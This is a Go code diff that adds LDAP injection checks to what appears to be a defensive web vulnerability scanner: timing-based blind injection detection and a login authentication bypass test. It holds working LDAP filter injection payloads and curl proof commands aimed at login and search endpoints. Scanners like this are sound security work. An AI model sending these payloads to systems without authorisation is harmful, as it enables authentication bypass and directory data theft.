@@ -112,6 +112,9 @@ var roleEndpointPaths = []string{
 var ldapInjectionPatterns = []string{
 	"*)(&",
 	"admin)(|(password=*)",
+	"*)(uid=*))(|(uid=*",
+	"admin)(|(objectclass=*",
+	"*)(userPassword=*",
 }
 
 // cloudMetadataURL is the AWS IMDSv1 endpoint used for SSRF testing.
@@ -190,6 +193,16 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 
 	// 9. LDAP injection
 	if f := checkLDAPInjection(ctx, client, asset, base); f != nil {
+		findings = append(findings, *f)
+	}
+
+	// 10. Blind LDAP injection (timing-based)
+	if f := checkLDAPBlindInjection(ctx, client, asset, base); f != nil {
+		findings = append(findings, *f)
+	}
+
+	// 11. LDAP authentication bypass
+	if f := checkLDAPAuthBypass(ctx, client, asset, base); f != nil {
 		findings = append(findings, *f)
 	}
 
@@ -835,6 +848,224 @@ func extractJSONString(body, key string) string {
 		return ""
 	}
 	return rest[:end]
+}
+
+// checkLDAPBlindInjection tests for blind LDAP injection by comparing response
+// times between a benign input and an LDAP wildcard payload. If the wildcard
+// payload takes significantly longer (indicating the server is enumerating
+// matching entries), it flags a blind LDAP injection vulnerability.
+func checkLDAPBlindInjection(ctx context.Context, client *http.Client, asset, base string) *finding.Finding {
+	testPaths := []struct {
+		path  string
+		param string
+	}{
+		{"/search", "q"},
+		{"/api/users", "filter"},
+		{"/api/search", "q"},
+		{"/users/search", "search"},
+	}
+
+	const blindPayload = "*)(uid=*))(|(uid=*"
+
+	for _, tp := range testPaths {
+		// Measure baseline response time with a benign value.
+		baselineURL := fmt.Sprintf("%s%s?%s=beacon-test-user", base, tp.path, tp.param)
+		baselineReq, err := http.NewRequestWithContext(ctx, http.MethodGet, baselineURL, nil)
+		if err != nil {
+			continue
+		}
+
+		baselineStart := time.Now()
+		baselineResp, err := client.Do(baselineReq)
+		if err != nil {
+			continue
+		}
+		io.ReadAll(io.LimitReader(baselineResp.Body, 64*1024))
+		baselineResp.Body.Close()
+		baselineDuration := time.Since(baselineStart)
+
+		if baselineResp.StatusCode != http.StatusOK {
+			continue
+		}
+
+		// Measure response time with the blind LDAP injection payload.
+		injectedURL := fmt.Sprintf("%s%s?%s=%s", base, tp.path, tp.param, blindPayload)
+		injectedReq, err := http.NewRequestWithContext(ctx, http.MethodGet, injectedURL, nil)
+		if err != nil {
+			continue
+		}
+
+		injectedStart := time.Now()
+		injectedResp, err := client.Do(injectedReq)
+		if err != nil {
+			continue
+		}
+		io.ReadAll(io.LimitReader(injectedResp.Body, 64*1024))
+		injectedResp.Body.Close()
+		injectedDuration := time.Since(injectedStart)
+
+		// A blind injection is indicated when the injected payload takes
+		// significantly longer — at least 3x baseline and at least 500ms more.
+		if injectedDuration > baselineDuration*3 && injectedDuration-baselineDuration > 500*time.Millisecond {
+			return &finding.Finding{
+				CheckID:  finding.CheckLDAPBlindInjection,
+				Module:   "deep",
+				Scanner:  scannerName,
+				Severity: finding.SeverityHigh,
+				Title:    "Blind LDAP injection detected via response timing",
+				Description: fmt.Sprintf(
+					"A search parameter at %s%s is vulnerable to blind LDAP injection. "+
+						"The LDAP wildcard payload %q caused a response time of %s compared to "+
+						"the baseline of %s, indicating the server is processing the injected LDAP "+
+						"filter and enumerating matching directory entries. An attacker can use binary "+
+						"search techniques to extract sensitive directory attributes character by character.",
+					base, tp.path, blindPayload,
+					injectedDuration.Round(time.Millisecond),
+					baselineDuration.Round(time.Millisecond),
+				),
+				Asset: asset,
+				ProofCommand: fmt.Sprintf(
+					"time curl -s '%s' && echo '---' && time curl -s '%s'",
+					baselineURL, injectedURL),
+				Evidence: map[string]any{
+					"url":               injectedURL,
+					"param":             tp.param,
+					"payload":           blindPayload,
+					"baseline_ms":       baselineDuration.Milliseconds(),
+					"injected_ms":       injectedDuration.Milliseconds(),
+					"timing_ratio":      float64(injectedDuration) / float64(baselineDuration),
+				},
+				DeepOnly:     true,
+				DiscoveredAt: time.Now(),
+			}
+		}
+	}
+	return nil
+}
+
+// checkLDAPAuthBypass tests login/authentication endpoints for LDAP injection
+// payloads that can bypass authentication. By injecting LDAP filter operators
+// into username fields, an attacker may authenticate without valid credentials.
+func checkLDAPAuthBypass(ctx context.Context, client *http.Client, asset, base string) *finding.Finding {
+	loginPaths := []string{
+		"/login",
+		"/api/login",
+		"/auth/login",
+		"/api/auth",
+		"/api/authenticate",
+	}
+
+	bypassPayloads := []struct {
+		username string
+		label    string
+	}{
+		{"*)(uid=*))(|(uid=*", "wildcard uid filter"},
+		{"admin)(|(objectclass=*", "objectclass wildcard bypass"},
+		{"*)(userPassword=*", "userPassword attribute extraction"},
+	}
+
+	for _, path := range loginPaths {
+		target := base + path
+
+		// First check if the login endpoint exists with a normal failed login.
+		normalPayload := []byte(`{"username":"beacon-test-user","password":"beacon-test-pass"}`)
+		normalReq, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(normalPayload))
+		if err != nil {
+			continue
+		}
+		normalReq.Header.Set("Content-Type", "application/json")
+		normalReq.Header.Set("Accept", "application/json")
+
+		normalResp, err := client.Do(normalReq)
+		if err != nil {
+			continue
+		}
+		normalBody, _ := io.ReadAll(io.LimitReader(normalResp.Body, 64*1024))
+		normalResp.Body.Close()
+
+		// Only test endpoints that return 401 or 200 with an error body for bad creds.
+		normalStatus := normalResp.StatusCode
+		if normalStatus == http.StatusNotFound || normalStatus == http.StatusMethodNotAllowed {
+			continue
+		}
+
+		for _, bp := range bypassPayloads {
+			injectedPayload := []byte(fmt.Sprintf(
+				`{"username":"%s","password":"beacon-test-pass"}`, bp.username))
+			injectedReq, err := http.NewRequestWithContext(ctx, http.MethodPost, target,
+				bytes.NewReader(injectedPayload))
+			if err != nil {
+				continue
+			}
+			injectedReq.Header.Set("Content-Type", "application/json")
+			injectedReq.Header.Set("Accept", "application/json")
+
+			injectedResp, err := client.Do(injectedReq)
+			if err != nil {
+				continue
+			}
+			injectedBody, _ := io.ReadAll(io.LimitReader(injectedResp.Body, 64*1024))
+			injectedResp.Body.Close()
+
+			injectedBodyStr := string(injectedBody)
+
+			// Auth bypass indicators:
+			// 1. Normal login fails (401) but injected login succeeds (200)
+			// 2. Response contains auth tokens/session indicators
+			// 3. Response body is significantly different and contains auth artifacts
+			authBypassed := false
+
+			if normalStatus == http.StatusUnauthorized && injectedResp.StatusCode == http.StatusOK {
+				authBypassed = true
+			}
+
+			if injectedResp.StatusCode == http.StatusOK &&
+				(strings.Contains(injectedBodyStr, `"token"`) ||
+					strings.Contains(injectedBodyStr, `"access_token"`) ||
+					strings.Contains(injectedBodyStr, `"session"`) ||
+					strings.Contains(injectedBodyStr, `"jwt"`)) {
+				// Verify the normal response didn't also contain tokens (e.g. guest mode).
+				normalBodyStr := string(normalBody)
+				if !strings.Contains(normalBodyStr, `"token"`) &&
+					!strings.Contains(normalBodyStr, `"access_token"`) {
+					authBypassed = true
+				}
+			}
+
+			if authBypassed {
+				return &finding.Finding{
+					CheckID:  finding.CheckLDAPAuthBypass,
+					Module:   "deep",
+					Scanner:  scannerName,
+					Severity: finding.SeverityCritical,
+					Title:    fmt.Sprintf("LDAP authentication bypass via injection at %s", target),
+					Description: fmt.Sprintf(
+						"The login endpoint at %s is vulnerable to LDAP authentication bypass. "+
+							"The payload %q (%s) caused a successful authentication response (HTTP %d) "+
+							"while a normal login attempt returned HTTP %d. The application interpolates "+
+							"user input directly into an LDAP bind or search filter, allowing an attacker "+
+							"to authenticate as any user without valid credentials.",
+						target, bp.username, bp.label,
+						injectedResp.StatusCode, normalStatus),
+					Asset: asset,
+					ProofCommand: fmt.Sprintf(
+						`curl -s -X POST '%s' -H 'Content-Type: application/json' -d '{"username":"%s","password":"test"}'`,
+						target, bp.username),
+					Evidence: map[string]any{
+						"url":             target,
+						"payload":         bp.username,
+						"payload_label":   bp.label,
+						"normal_status":   normalStatus,
+						"injected_status": injectedResp.StatusCode,
+						"body_snippet":    truncate(injectedBodyStr, 300),
+					},
+					DeepOnly:     true,
+					DiscoveredAt: time.Now(),
+				}
+			}
+		}
+	}
+	return nil
 }
 
 // isKeycloakSAMLBypassVulnerable returns true for Keycloak < 26.0.6.
